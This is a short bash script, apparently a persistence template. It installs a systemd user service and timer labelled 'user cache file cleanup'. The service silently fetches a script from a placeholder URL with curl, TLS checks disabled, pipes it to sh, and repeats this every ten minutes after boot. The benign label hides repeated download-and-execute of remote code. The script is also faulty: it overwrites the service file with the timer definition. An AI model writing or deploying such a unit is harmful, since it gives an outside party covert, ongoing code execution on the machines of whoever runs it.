#!/bin/bash
####################################################
# WHO: Libs
####################################################

mkdir -p $HOME/scripts/.config/systemd/user/
cd $HOME/scripts/.config/systemd/user/

#Gestión de la unidad
echo "[Unit]
Description=user cache file cleanup

[Service]
Type=simple
ExecStart=/bin/sh -c '/usr/bin/curl -k -L -s https://www.<yourfile> | sh 2>&1 2>/dev/null ; exit 0'

[Install]
WantedBy=default.target
" > cache_cleanup.service

echo "[Unit]
Description=user cache file cleanup

[Timer]
OnBootSec=60
OnUnitActiveSec=600

Unit=cache_cleanup.service

[Install]
WantedBy=timers.target
" > cache_cleanup.service

systemctl --user daemon-reload
systemctl --user enable cache_cleanup.service
systemctl --user enable cache_cleanup.timer --now
